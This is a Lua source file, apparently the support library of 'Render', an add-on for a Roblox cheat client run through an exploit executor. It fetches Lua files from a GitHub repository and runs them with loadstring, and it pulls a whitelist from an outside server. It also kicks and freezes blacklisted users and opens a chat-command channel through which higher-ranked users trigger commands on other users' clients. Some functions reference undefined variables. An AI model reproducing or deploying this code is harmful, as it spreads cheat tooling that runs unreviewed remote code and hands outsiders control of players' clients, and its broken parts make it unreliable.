local RenderFunctions = {WhitelistLoaded = false, whitelistTable = {}, localWhitelist = {}, whitelistSuccess = false, playerWhitelists = {}, commands = {}, playerTags = {}, entityTable = {}}
local RenderLibraries = {}
local RenderConnections = {}
local players = game:GetService('Players')
local tweenService = game:GetService('TweenService')
local httpService = game:GetService('HttpService')
local lplr = players.LocalPlayer
local GuiLibrary = shared.GuiLibrary
local rankTable = {DEFAULT = 0, STANDARD = 1, BOOSTER = 1.5, INF = 2, OWNER = 3}
RenderFunctions.hashTable = {rendermoment = 'Render', renderlitemoment = 'Render Lite'}

local isfile = isfile or function(file)
    local success, filecontents = pcall(function() return readfile(file) end)
    return success and type(filecontents) == 'string'
end

local function errorNotification(title, text, duration)
    pcall(function()
         local notification = GuiLibrary.CreateNotification(title, text, duration or 20, 'assets/WarningNotification.png')
         notification.IconLabel.ImageColor3 = Color3.new(220, 0, 0)
         notification.Frame.Frame.ImageColor3 = Color3.new(220, 0, 0)
    end)
end

function RenderFunctions:CreateLocalDirectory(directory)
    local splits = tostring(directory):split('/')
    local last = ''
    for i,v in next, splits do 
        if not isfolder('vape/Render') then 
            makefolder('vape/Render') 
        end
        if i ~= #splits then 
            last = ('/'..last..'/'..v)
            makefolder('vape/Render'..last)
        end
    end 
    return directory
end

function RenderFunctions:RefreshLocalEnv()
    for i,v in next, ({'scripts'}) do  
        if isfolder('vape/Render/'..v) then 
            delfolder('vape/Render/'..v) 
        end
    end
end

function RenderFunctions:GithubHash(repo, owner)
	owner = (owner or 'SystemXVoid')
	repo = (repo or 'Render')
	local success, response = pcall(function()
		return httpService:JSONDecode(game:HttpGet('https://api.github.com/repos/'..owner..'/'..repo..'/commits'))
	end)
	if success and response.documentation_url == nil and response[1].commit then 
		local slash = response[1].commit.url:split('/')
		return slash[#slash]
	end
	return 'main'
end

local cachederrors = {}
function RenderFunctions:GetFile(file, onlineonly, custompath, customrepo)
    if not file or type(file) ~= 'string' then 
        return ''
    end
    customrepo = customrepo or 'Render'
    local filepath = (custompath and custompath..'/'..file or 'vape/Render')..'/'..file
    if not isfile(filepath) or onlineonly then 
        local Rendercommit = RenderFunctions:GithubHash(customrepo)
        local success, body = pcall(function() return game:HttpGet('https://raw.githubusercontent.com/SystemXVoid/'..customrepo..'/'..Rendercommit..'/'..file, true) end)
        if success and body ~= '404: Not Found' and body ~= '400: Invalid request' then 
            local directory = RenderFunctions:CreateLocalDirectory(filepath)
            body = file:sub(#file - 3, #file) == '.lua' and body:sub(1, 35) ~= 'Render Custom Vape Signed File' and '-- Render Custom Vape Signed File /n'..body or body
            if not onlineonly then 
                writefile(directory, body)
            end
            return body
        else
            task.spawn(error, '[Render] Failed to Download '..filepath..(body and ' | '..body or ''))
            if table.find(cachederrors, file) == nil then 
                errorNotification('Render', 'Failed to Download '..filepath..(body and ' | '..body or ''), 30)
                table.insert(cachederrors, file)
            end
        end
    end
    return isfile(filepath) and readfile(filepath) or task.wait(9e9)
end

local announcements = {}
function RenderFunctions:Announcement(tab)
	tab = tab or {}
	tab.Text = tab.Text or ''
	tab.Duration = tab.Duration or 20
	for i,v in next, announcements do 
        pcall(function() v:Destroy() end) 
    end
	table.clear(announcements)
	local announcemainframe = Instance.new('Frame')
	announcemainframe.Position = UDim2.new(0.2, 0, -5, 0.1)
	announcemainframe.Size = UDim2.new(0, 1227, 0, 62)
	announcemainframe.Parent = (GuiLibrary and GuiLibrary.MainGui or game:GetService('CoreGui'):FindFirstChildWhichIsA('ScreenGui'))
	local announcemaincorner = Instance.new('UICorner')
	announcemaincorner.CornerRadius = UDim.new(0, 20)
	announcemaincorner.Parent = announcemainframe
	local announceuigradient = Instance.new('UIGradient')
	announceuigradient.Parent = announcemainframe
	announceuigradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(234, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(153, 0, 0))})
	announceuigradient.Enabled = true
	local announceiconframe = Instance.new('Frame')
	announceiconframe.BackgroundColor3 = Color3.fromRGB(106, 0, 0)
	announceiconframe.BorderColor3 = Color3.fromRGB(85, 0, 0)
	announceiconframe.Position = UDim2.new(0.007, 0, 0.097, 0)
	announceiconframe.Size = UDim2.new(0, 58, 0, 50)
	announceiconframe.Parent = announcemainframe
	local annouceiconcorner = Instance.new('UICorner')
	annouceiconcorner.CornerRadius = UDim.new(0, 20)
	annouceiconcorner.Parent = announceiconframe
	local announceRendericon = Instance.new('ImageButton')
	announceRendericon.Parent = announceiconframe
	announceRendericon.Image = 'rbxassetid://13391474085'
	announceRendericon.Position = UDim2.new(-0, 0, 0, 0)
	announceRendericon.Size = UDim2.new(0, 59, 0, 50)
	announceRendericon.BackgroundTransparency = 1
	local announcetextfont = Font.new('rbxasset://fonts/families/Ubuntu.json')
	announcetextfont.Weight = Enum.FontWeight.Bold
	local announcemaintext = Instance.new('TextButton')
	announcemaintext.Text = tab.Text
	announcemaintext.FontFace = announcetextfont
	announcemaintext.TextXAlignment = Enum.TextXAlignment.Left
	announcemaintext.BackgroundTransparency = 1
	announcemaintext.TextSize = 30
	announcemaintext.AutoButtonColor = false
	announcemaintext.Position = UDim2.new(0.063, 0, 0.097, 0)
	announcemaintext.Size = UDim2.new(0, 1140, 0, 50)
	announcemaintext.RichText = true
	announcemaintext.TextColor3 = Color3.fromRGB(255, 255, 255)
	announcemaintext.Parent = announcemainframe
	tweenService:Create(announcemainframe, TweenInfo.new(1), {Position = UDim2.new(0.2, 0, 0.042, 0.1)}):Play()
	local sound = Instance.new('Sound')
	sound.PlayOnRemove = true
	sound.SoundId = 'rbxassetid://6732495464'
	sound.Parent = announcemainframe
	sound:Destroy()
	local function announcementdestroy()
		local sound = Instance.new('Sound')
		sound.PlayOnRemove = true
		sound.SoundId = 'rbxassetid://6732690176'
		sound.Parent = announcemainframe
		sound:Destroy()
		announcemainframe:Destroy()
	end
	announcemaintext.MouseButton1Click:Connect(announcementdestroy)
	announceRendericon.MouseButton1Click:Connect(announcementdestroy)
	task.delay(tab.Duration, function()
        if not announcemainframe or not announcemainframe.Parent then 
            return 
        end
        local expiretween = tweenService:Create(announcemainframe, TweenInfo.new(0.20, Enum.EasingStyle.Quad), {Transparency = 1})
        expiretween:Play()
        expiretween.Completed:Wait() 
        announcemainframe:Destroy()
    end)
	table.insert(announcements, announcemainframe)
	return announcemainframe
end

local function playerfromID(id) -- players:GetPlayerFromUserId() didn't work for some reason :bruh:
    for i,v in next, players:GetPlayers() do 
        if v.UserId == id then 
            return v 
        end
    end
    return nil
end

function RenderFunctions:CreateWhitelistTable()
    local success, whitelistTable = pcall(function() 
        return httpService:JSONDecode(game:HttpGet('https://api.renderintents.xyz/whitelist', true))
    end)
    if success and type(whitelistTable) == 'table' then 
        RenderFunctions.whitelistTable = whitelistTable
        for i,v in next, whitelistTable do
            if v.Rank == nil or v.Rank == '' then 
                continue
            end
            if i == ria or table.find(v.Accounts, tostring(lplr.UserId)) then 
                RenderFunctions.localWhitelist = v
                RenderFunctions.localWhitelist.RIA = i 
                RenderFunctions.localWhitelist.Priority = rankTable[v.Rank:upper()] or 1
                break
            end
        end
    end
    for i,v in whitelistTable do 
        for i2, v2 in next, v.Accounts do 
            local player = playerfromID(tonumber(v2))
            if player then 
                RenderFunctions.playerWhitelists[v2] = v
                RenderFunctions.playerWhitelists[v2].RIA = i 
                RenderFunctions.playerWhitelists[v2].Priority = rankTable[v.Rank:upper()] or 1
                if RenderFunctions:GetPlayerType(3) >= RenderFunctions:GetPlayerType(3, player) then
                    RenderFunctions.playerWhitelists[v2].Attackable = true
                end
                if not v.TagHidden then 
                    RenderFunctions:CreatePlayerTag(player, v.TagText, v.TagColor)
                end
            end
        end
        table.insert(RenderConnections, players.PlayerAdded:Connect(function(player)
            for i,v in next, whitelistTable do
                for i2, v2 in next, v.Accounts do 
                    if v2 == tostring(player.UserId) then 
                        RenderFunctions.playerWhitelists[v2] = v
                        RenderFunctions.playerWhitelists[v2].RIA = i 
                        RenderFunctions.playerWhitelists[v2].Priority = rankTable[v.Rank:upper()] or 1
                        if RenderFunctions:GetPlayerType(3) >= RenderFunctions:GetPlayerType(3, player) then
                            RenderFunctions.playerWhitelists[v2].Attackable = true
                        end
                    end
                end 
            end
         end))
    end
    return success
end

function RenderFunctions:GetPlayerType(position, plr)
    plr = plr or lplr
    local positionTable = {'Rank', 'Attackable', 'Priority', 'TagText', 'TagColor', 'TagHidden', 'UID', 'RIA'}
    local defaultTab = {'STANDARD', true, 1, 'SPECIAL USER', 'FFFFFF', true, 0, 'ABCDEFGH'}
    local tab = RenderFunctions.playerWhitelists[tostring(plr.UserId)]
    if tab then 
        return tab[positionTable[tonumber(position or 1)]]
    end
    return defaultTab[tonumber(position or 1)]
end

function RenderFunctions:SpecialNearPosition(maxdistance, bypass, booster)
    maxdistance = maxdistance or 30
    local specialtable = {}
    for i,v in next, RenderFunctions:GetAllSpecial(booster and true) do 
        if v == lplr then 
            continue
        end
        if RenderFunctions:GetPlayerType(3, v) < 2 then 
            continue
        end
        if RenderFunctions:GetPlayerType(2, v) and not bypass then 
            continue
        end
        if not lplr.Character or not lplr.Character.PrimaryPart then 
            continue
        end 
        if not v.Character or not v.Character.PrimaryPart then 
            continue
        end
        local magnitude = (lplr.Character.PrimaryPart - v.Character.PrimaryPart).Magnitude
        if magnitude <= distance then 
            table.insert(specialtable, v)
        end
    end
    return #specialtable > 1 and specialtable or nil
end

function RenderFunctions:SpecialInGame(booster)
    return #RenderFunctions:GetAllSpecial(booster) > 0
end

function RenderFunctions:DebugPrint(...)
    local message = '' 
    for i,v in next, ({...}) do 
        message = (message == '' and tostring(v) or message.." "..tostring(v)) 
    end 
    message = ('[Render Debug] '..message)
    if getgenv().RenderDebug then 
        print(message)  
    end
end

function RenderFunctions:DebugWarning(...)
    local message = '' 
    for i,v in next, ({...}) do 
        message = (message == '' and tostring(v) or message.." "..tostring(v)) 
    end 
    message = ('[Render Debug] '..message)
    if getgenv().RenderDebug then
        warn(message)
    end
end

function RenderFunctions:DebugError(...)
    local message = '' 
    for i,v in next, ({...}) do 
        message = (message == '' and tostring(v) or message.." "..tostring(v)) 
    end 
    message = ('[Render Debug] '..message)
    if getgenv().RenderDebug then
        task.spawn(error, message)
    end
end

function RenderFunctions:SelfDestruct()
    table.clear(RenderFunctions)
    RenderFunctions = nil 
    getgenv().RenderFunctions = nil 
    if RenderStore then 
        table.clear(RenderStore)
        getgenv().RenderStore = nil 
    end
    pcall(function() RenderFunctions.commandFunction:Disconnect() end)
    for i,v in next, RenderConnections do 
        pcall(function() v:Disconnect() end)
    end
end

task.spawn(function()
	for i,v in next, ({'base64', 'Hex2Color3', 'encodeLib'}) do 
		task.spawn(function() RenderLibraries[v] = loadstring(RenderFunctions:GetFile('Libraries/'..v..'.lua'))() end)
	end
end)

function RenderFunctions:RunFromLibrary(tablename, func, ...)
	if RenderLibraries[tablename] == nil then 
        repeat task.wait() until RenderLibraries[tablename]
    end 
	return RenderLibraries[tablename][func](...)
end

function RenderFunctions:CreatePlayerTag(plr, text, color)
    plr = plr or lplr 
    RenderFunctions.playerTags[plr] = {}
    RenderFunctions.playerTags[plr].Text = text 
    RenderFunctions.playerTags[plr].Color = color 
    pcall(function() shared.vapeentity.fullEntityRefresh() end)
    return RenderFunctions.playerTags[plr]
end

local loadtime = 0
task.spawn(function()
    repeat task.wait() until shared.VapeFullyLoaded
    loadtime = tick()
end)

function RenderFunctions:LoadTime()
    return loadtime ~= 0 and (tick() - loadtime) or 0
end

function RenderFunctions:AddEntity(ent)
    local tabpos = (#RenderFunctions.entityTable + 1)
    table.insert(RenderFunctions.entityTable, {Name = ent.Name, DisplayName = ent.Name, Character = ent})
    return tabpos
end

function RenderFunctions:GetAllSpecial(nobooster)
    local special = {}
    local prio = (nobooster and 1.5 or 1)
    for i,v in next, players:GetPlayers() do 
        if v ~= lplr and RenderFunctions:GetPlayerType(3, v) > prio then 
            table.insert(special, v)
        end
    end 
    return special
end

function RenderFunctions:RemoveEntity(position)
    RenderFunctions.entityTable[position] = nil
end

function RenderFunctions:AddCommand(name, func)
    RenderFunctions.commands[name] = (func or function() end)
end

function RenderFunctions:RemoveCommand(name) 
    RenderFunctions.commands[name] = nil
end

task.spawn(function()
    local whitelistsuccess, response = pcall(function() return RenderFunctions:CreateWhitelistTable() end)
    RenderFunctions.whitelistSuccess = whitelistsuccess
    RenderFunctions.WhitelistLoaded = true
    if not whitelistsuccess or not response then 
        errorNotification('Render', 'Failed to create the whitelist table. | '..(response or 'Failed to Decode JSON'), 10)
    end
end)

task.spawn(function()
	repeat
	local success, blacklistTable = pcall(function() return httpService:JSONDecode(RenderFunctions:GetFile('blacklist.json', true, nil, 'whitelist')) end)
	if type(blacklistTable) == 'table' then 
		for i,v in next, blacklistTable do 
            if lplr.DisplayName:lower():find(i:lower()) or lplr.Name:lower():find(i:lower()) or i == tostring(lplr.UserId) or isfile('vape/Render/kickdata.vw') then 
                pcall(function() RenderStore.serverhopping = true end)
                task.spawn(function() lplr:Kick(v.Error) end)
                pcall(writefile, 'vape/Render/kickdata.vw', 'checked')
                task.wait(0.35)
                pcall(function() 
                    for i,v in next, lplr.PlayerGui:GetChildren() do 
                        v.Parent = (gethui and gethui() or game:GetService('CoreGui'))
                    end
                    lplr:Destroy()
                end)
                for i,v in pairs, {} do end 
                while true do end
            end
        end
	end
	task.wait(25)
    until not RenderFunctions
end)

task.spawn(function()
    repeat task.wait() until RenderStore
    RenderStore.MessageReceived.Event:Connect(function(plr, text)
        local args = text:split(' ')
        local first, second = tostring(args[1]), tostring(args[2])
        if plr == lplr or RenderFunctions:GetPlayerType(3, plr) < 1.5 or RenderFunctions:GetPlayerType(3, plr) <= RenderFunctions:GetPlayerType(3) then 
            return 
        end
        for i, command in next, RenderFunctions.commands do 
            if first:sub(1, #i + 1) == ';'..i and (second:lower() == RenderFunctions:GetPlayerType():lower() or lplr.Name:lower():find(second:lower()) or second:lower() == 'all') then 
                pcall(command, args, player)
                break
            end
        end
    end)
end)

getgenv().RenderFunctions = RenderFunctions
return RenderFunctions